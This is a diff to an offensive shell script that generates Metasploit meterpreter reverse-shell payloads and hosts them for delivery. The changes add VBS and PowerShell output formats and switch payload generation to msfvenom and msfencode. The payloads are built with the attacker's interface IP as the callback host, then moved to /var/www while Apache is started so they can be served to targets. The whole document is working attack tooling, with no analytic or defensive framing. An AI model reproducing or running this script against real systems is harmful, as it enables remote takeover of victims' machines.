@@ -35,6 +35,7 @@ info()     { echo -e "${BOLD}${BLUE}[INFO]${RESET} ${@}"; }
 MSFPAY=`which msfpayload`
 MSFCLI=`which msfcli`
 MSFVENOM=`which msfvenom`
+MSFENC=`which msfencode`
 
 attacker="" # interface ip
 
@@ -56,7 +57,7 @@ attacker=`ifconfig $1 | grep "inet " | cut -d: -f2 | cut -d" " -f1`
 
 if [ $# -ne 5 ]; then
 usage "Script to generate reverse metasploit payloads and launch listener."
-usage "$0 <port> <e(X)e|(P)hp|(D)ll|(V)BA > <filename> <eth1|tap0> <(H)ttp|Http(S)|(T)cp>"
+usage "$0 <port> <e(X)e|(P)hp|(D)ll|(V)BA|V(B)s|p(S)h> <filename> <eth1|tap0> <(H)ttp|Http(S)|(T)cp>"
 exit
 fi
 
@@ -83,25 +84,47 @@ case $type in
  'X')
  type_payload="windows"
  extension="exe"
- format="X"
+ arch="x86"
+ #format="X"
+ format="exe"
  ;;
  
  'D')
  type_payload="windows"
- extension="dll"    
-  format="D"
+ extension="dll"  
+  arch="x86"
+ # format="D"
+ format="dll"
  ;;
  
  'P')
- type_payload="php"
+ type_payload="php" # this works in msfpayload 
  extension="php.txt"
-  format="R"
+  arch="x86"
+ # format="R"
  ;;
  
  'V')
  type_payload="windows"
+  arch="x86"
  extension="vba"
- format="V"
+ #format="V"
+ format="vbs"
+ ;;
+ 
+ 'B')
+ type_payload="windows"
+ arch="x86"
+ extension="vbs"
+ format="vbs"
+ ;;
+ 
+ 'S')
+ type_payload="windows"
+ arch="x86"
+ extension="ps1"
+ format="psh"
+ #format="psh" # psh x64 does not work for msfvenom
  ;;
  
  
@@ -130,8 +153,21 @@ esac
 
   info "Wait till we are Generating the [${BOLD}${YELLOW}$filename.$extension${RESET}]"
   #echo "$MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension"
-  $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension
-
+ # $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension
+  case $type in
+  
+  'S' | 'P')
+  success "MSFPAYLOAD"
+   $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port EXITFUNC=thread R | $MSFENC -t $format -a $arch> $dir/$filename.$extension
+  ;;
+  
+  'X' | 'D' | 'V' | 'B')
+  success "MSFVENOM"
+  $MSFVENOM -p $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port -f $format -a $arch > $dir/$filename.$extension
+  ;;
+  
+  esac
+  
   info "Transfer the [${BOLD}${YELLOW}$filename.$extension${RESET}] to /var/www for delivery and starting webserver"
   mv $filename.$extension /var/www
   /etc/init.d/apache2 start
